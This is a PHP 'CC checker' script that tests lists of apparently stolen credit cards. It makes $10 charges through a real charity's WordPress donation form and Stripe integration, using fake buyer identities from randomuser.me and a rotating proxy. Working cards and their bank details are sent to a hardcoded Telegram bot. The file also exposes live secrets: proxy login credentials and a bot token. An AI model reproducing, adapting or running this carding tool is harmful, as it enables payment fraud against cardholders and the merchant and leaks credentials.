<?php
///made by hidefiles
date_default_timezone_set('Asia/Manila');
error_reporting(0);
set_time_limit(0);
$set = microtime(true);

function Get($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}


function CreditCards($piko, $piko2)
{
  $files = str_replace($piko, $piko[0], $piko2);
  $piko3 = explode($piko[0], $files);
  return $piko3;
}

function random($length = 10){
  $str = '';
  $_s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwyxz0123456789';
  $strlen = strlen($_s);
  for($x = $length; $x != 0; $x--){
    $str .= $_s[mt_rand(1, $strlen)-1];
  }
  return $str;
}

$webkit = random(16);

function getContents($str, $startDelimiter, $endDelimiter) {
  $contents = array();
  $startDelimiterLength = strlen($startDelimiter);
  $endDelimiterLength = strlen($endDelimiter);
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom))) {
    $contentStart += $startDelimiterLength;
    $contentEnd = strpos($str, $endDelimiter, $contentStart);
    if (false === $contentEnd) {
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + $endDelimiterLength;
  }

  return $contents;
}

///////////////////////////GETTTTTTTTTTTTTTTTTTTTTTTTTTTTT//////////////////////////////////////////////////////////////////////////////////////////////////////////

$list = $_GET['lista'];
$cc = CreditCards(array(":", "|", ""), $list)[0];
$mm = CreditCards(array(":", "|", ""), $list)[1];
$m = CreditCards(array(":", "|", ""), $list)[1];
$yy = CreditCards(array(":", "|", ""), $list)[2];
$cvv = CreditCards(array(":", "|", ""), $list)[3];
$last4 = substr($cc, 12, 16);
$bin = substr($cc, 16, 6);

////////////////////////////=====[Bank-Information]

function getbnk($schem)
{
 sleep(rand(1,6));
$schem = substr($schem,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$schem.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$schem.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$schem|$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$schem|Unknown.";
}
}

if (strpos($fim, '"scheme":"visa"')) {
    $card = 'VI';
} elseif (strpos($fim, '"scheme":"mastercard"')) {
    $card = 'MC';
} elseif (strpos($fim, '"scheme":"amex"')) {
    $card = 'AM';
} elseif (strpos($fim, '"scheme":"discover"')) {
    $card = 'DS';
} elseif (strpos($fim, '"scheme":"jcb"')) {
    $card = 'JCB';
} if (strpos($fim, '"type":"debit"')) {
    $type = 'DEBIT';
} else {
    $type = 'CREDIT';
}


$rand = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd');
$color = $rand[rand(0,15)].$rand[rand(0,15)].$rand[rand(0,15)].$rand[rand(0,15)];

switch ($m) {
  case '01':
    $m = '1';
    break;
  case '02':
    $m = '2';
    break;
  case '03':
    $m = '3';
    break;
  case '04':
    $m = '4';
    break;
  case '05':
    $m = '5';
    break;
  case '06':
    $m = '6';
    break;
  case '07':
    $m = '7';
    break;
  case '08':
    $m = '8';
    break;
  case '09':
    $m = '9';
    break;
}

$oo = [
  'cookie' => mt_rand().'.txt'
];

$cbin = substr($cc, 0,1);
if ($cbin == 6) {
  $cbin = 'DS';
}
else if ($cbin == 5) {
  $cbin = 'MC';
}
else if ($cbin == 4) {
  $cbin = 'VI';
}
else if ($cbin == 3) {
  $cbin = 'DS';
}
else if ($cbin == 3) {
  $cbin = 'JCB';
}
else {
  $cbin = 'nall';
}

///////////////////////////////randomusers//////////////////////////////////////////////

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"gender\":\"(.*)\")siU", $get, $matches1);
$gender = $matches1[1][0];
preg_match_all("(\"title\":\"(.*)\")siU", $get, $matches1);
$title = $matches1[1][0];
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
$username = $matches1[1][0];
preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
$password = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
////colour mode
//$color = str_pad(dechex(rand(0x000000, 0xFFFFFF)), 6, 0, STR_PAD_LEFT);

$proxy_host = "http://gw.ntnt.io";
$proxy_port = "5959";
$loginpassw = "rimurukawra-dc-ANY:Ngingi666!";

$files = curl_init();

curl_setopt_array($files, array(
  CURLOPT_URL => "https://ip.nf/me.json",
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_PROXY => $proxy_host,
  CURLOPT_PROXYPORT => $proxy_port,
  CURLOPT_PROXYUSERPWD => $loginpassw,
  
));
$ips = curl_exec($files);
$ip1 = Get($ips, '"ip":"','"');
$country_code = Get($ips, '"country_code":"','"');
curl_close($files);
ob_flush();

/*if (substr($ips, true)) {
  echo '<font size=1> <b><i> </b></span> </span>  <span class="text-success"> IP: $ip1 || C_CODE: $country_code <b><i></span> </br>';
}else{
  echo '<font size=1> <b><i> </b></span> </span>  <span class="text-danger"> network error/dead <b><i></span> </br>';
}*/

$ros = getcwd();
$oo1 = str_replace('\\', '/', $ros);

$files = curl_init();

curl_setopt_array($files, array(
  CURLOPT_COOKIEJAR => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_URL => 'https://www.gcwmi.org/home/?asp_action=show_pp&product_id=812',
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_FOLLOWLOCATION => 1,
  CURLOPT_PROXY => $proxy_host,
  CURLOPT_PROXYPORT => $proxy_port,
  CURLOPT_PROXYUSERPWD => $loginpassw,
  CURLOPT_HTTPHEADER => array(
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71",
  ),
));

$PaymentBox = curl_exec($files);
$pi_nonce = Get($PaymentBox, '"asp_pp_ajax_create_pi_nonce":"','"');
$ajax_nonce = Get($PaymentBox, '"asp_pp_ajax_nonce":"','"');
curl_close($files);

$files = curl_init();

curl_setopt_array($files, array(
  CURLOPT_COOKIEJAR => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_COOKIEFILE => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_URL => 'https://www.gcwmi.org/home/wp-admin/admin-ajax.php',
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_FOLLOWLOCATION => 1,
  CURLOPT_PROXY => $proxy_host,
  CURLOPT_PROXYPORT => $proxy_port,
  CURLOPT_PROXYUSERPWD => $loginpassw,
  CURLOPT_POSTFIELDS => 'action=asp_pp_create_pi&nonce='.$pi_nonce.'&amount=1000&curr=USD&product_id=812&quantity=1&billing_details={"name":"'.$first.' '.$last.'","email":"'.$email.'"}&token=1c8b98a5e7535e96b022747560ada94c',
  CURLOPT_HTTPHEADER => array(
    "accept: */*",
    "content-type: application/x-www-form-urlencoded",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71",
  ),
));

$create_intent = curl_exec($files);
$clientSecret = Get($create_intent, '"clientSecret":"','"');
$pi_id = Get($create_intent, '"pi_id":"','"');
curl_close($files);

$files = curl_init();

curl_setopt_array($files, array(
  CURLOPT_COOKIEJAR => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_COOKIEFILE => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_FOLLOWLOCATION => 1,
  CURLOPT_PROXY => $proxy_host,
  CURLOPT_PROXYPORT => $proxy_port,
  CURLOPT_PROXYUSERPWD => $loginpassw,
  CURLOPT_POSTFIELDS => 'card[name]='.$first.'+'.$last.'&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&payment_user_agent=stripe.js%2F2eb477d0b%3B+stripe-js-v3%2F2eb477d0b&key=pk_live_FAtJUHvATE8CR3kDQydd7hWM&_stripe_version=2020-03-02&pasted_fields=number',
  CURLOPT_HTTPHEADER => array(
    "accept: application/json",
    "content-type: application/x-www-form-urlencoded",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71",
  ),
));

$token = curl_exec($files);
$tok = Get($token, '"id": "','"');
$message = Get($token, '"message": "','"');
curl_close($files);

$files = curl_init();

curl_setopt_array($files, array(
  CURLOPT_COOKIEJAR => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_COOKIEFILE => "".$oo1."/COOKIE/".$oo['cookie']."",
  CURLOPT_URL => 'https://www.gcwmi.org/home/wp-admin/admin-ajax.php',
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_FOLLOWLOCATION => 1,
  CURLOPT_PROXY => $proxy_host,
  CURLOPT_PROXYPORT => $proxy_port,
  CURLOPT_PROXYUSERPWD => $loginpassw,
  CURLOPT_POSTFIELDS => 'action=asp_pp_confirm_pi&nonce='.$ajax_nonce.'&product_id=812&pi_id='.$pi_id.'&token=1c8b98a5e7535e96b022747560ada94c&opts={"receipt_email":"'.$email.'","payment_method_data":{"type":"card","card":{"token":"'.$tok.'"},"billing_details":{"name":"'.$first.' '.$last.'","email":"'.$email.'"}}}',
  CURLOPT_HTTPHEADER => array(
    "accept: */*",
    "content-type: application/x-www-form-urlencoded",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71",
  ),
));

$ajax_php = curl_exec($files);
$msg = substr(json_decode($ajax_php,true)['err'], 27);
$err = strip_tags(json_decode($ajax_php,true)['err']);
$Approved = Get($ajax_php, '{"pi_id":"','"}');

if (strpos($ajax_php, ''.$Approved.''))
{
echo '<font size=3> <b><i> </b></span> </span>  <span class="text-success"> #APPROVED <font size=3> <b><i> '.$list.' </span> <span class="text-success"> -> <span class="text-warning"> BIN -> '.getbnk($cc).' <font size=3> </span>  <span> <span class="text-success"> <b><i> -> SUCCESS WITH RECEIPT -> '.$Approved.' <b><i></span> </br>';$form = "$list";
   file_get_contents('https://api.telegram.org/bot5112570737:AAFGYqD2UI5uSXFSZjpmlFqP56Ttr8zAPrg/sendmessage?chat_id=5186790719&text=✅Success With Receipt ->  -> '.$form.' -> CCN -> Info -> '.getbnk($cc).' &parse_mode=HTML');
}
elseif (strpos($ajax_php, 'The zip code you supplied failed validation.')) 
{
echo '<font size=3> <b><i> </b></span> </span>  <span class="text-success"> #APPROVED <font size=3> <b><i> '.$list.' </span> <span class="text-success"> -> <span class="text-warning"> BIN -> '.getbnk($cc).' <font size=3> </span>  <span> <span class="text-success"> <b><i> -> AVS TRUE <b><i></span> </br>';$form = "$list";
   file_get_contents('https://api.telegram.org/bot5112570737:AAFGYqD2UI5uSXFSZjpmlFqP56Ttr8zAPrg/sendmessage?chat_id=5186790719&text=✅Payment Not Approve! -> '.$form.' -> CCN/AVS -> Info -> '.getbnk($cc).' &parse_mode=HTML');
}
elseif (strpos($token, ''.$message.'')> null) 
{
  echo '<font size=3> <b><i> </b></span> </span>  <span class="text-danger"> #DECLINE <font size=3> <b><i> '.$list.' </span> <span class="text-danger"> -> <span class="text-warning"> BIN -> '.getbnk($cc).' <font size=3> </span><span><span class="text-danger"> <b><i> -> ['.$message.'] <b><i></span> </br>';
}
elseif (strpos($ajax_php, 'Stripe API error occurred:')> null) 
{
  echo '<font size=3> <b><i> </b></span> </span>  <span class="text-danger"> #DECLINE <font size=3> <b><i> '.$list.' </span> <span class="text-danger"> -> <span class="text-warning"> BIN -> '.getbnk($cc).' <font size=3> </span><span><span class="text-danger"> <b><i> -> ['.$msg.'] <b><i></span> </br>';
}
else
{
  echo '<font size=3> <b><i> </b></span> </span>  <span class="text-danger"> #DECLINE <font size=3> <b><i> '.$list.' </span> <span class="text-danger"> -> <span class="text-warning"> BIN -> '.getbnk($cc).' <font size=3> </span><span><span class="text-danger"> <b><i> -> ['.$err.'] <b><i></span> </br>';

}
curl_close($files);
unlink("".$oo1."/COOKIE/".$oo['cookie']."");
?>